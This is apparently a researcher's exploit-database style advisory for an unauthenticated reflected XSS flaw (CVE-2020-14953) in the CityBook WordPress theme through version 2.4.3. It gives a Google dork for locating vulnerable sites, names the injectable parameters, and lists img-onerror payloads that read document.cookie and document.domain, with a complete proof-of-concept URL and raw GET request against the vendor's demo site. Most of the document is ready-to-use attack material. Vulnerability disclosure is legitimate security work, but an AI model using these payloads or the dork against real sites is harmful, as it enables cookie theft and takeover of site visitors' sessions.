/*!
- # VULNERABILITY: CityBook WordPress Theme <= 2.4.3 - Unauthenticated Reflected XSS
- # GOOGLE DORK: inurl:/wp-content/themes/citybook/
- # DATE: 2020-06-17
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: CTHthemes [ https://cththemes.com ]
- # SOFTWARE VERSION: <= 2.4.3
- # SOFTWARE LINK: https://themeforest.net/item/citybook-directory-listing-wordpress-theme/21694727
- # CVSS: AV:N/AC:L/PR:N/UI:N/S:C
- # CWE: CWE-79
- # CVE: CVE-2020-14953
*/



### -- [ Info: ]

[i] An Unauthenticated Reflected XSS vulnerability was discovered in the CityBook theme through v2.4.3 for WordPress.

[i] Vulnerable parameter(s): &distance=, &address_lat=, &address_lng=.



### -- [ Impact: ]

[~] Malicious JavaScript code injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] "><img src=x onerror=alert(document.domain)>

[$] "><img src=x onerror=alert(document.cookie)>



### -- [ PoC | Unauthenticated Reflected XSS: ]

[!] https://citybook2.cththemes.com/?search_term=&distance=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&nearby=&address_lat=%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E&address_lng=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&lcats[]=47

[!] GET /?search_term=&distance=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&nearby=&address_lat=%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E&address_lng=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&lcats[]=47 HTTP/1.1
Host: citybook2.cththemes.com



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
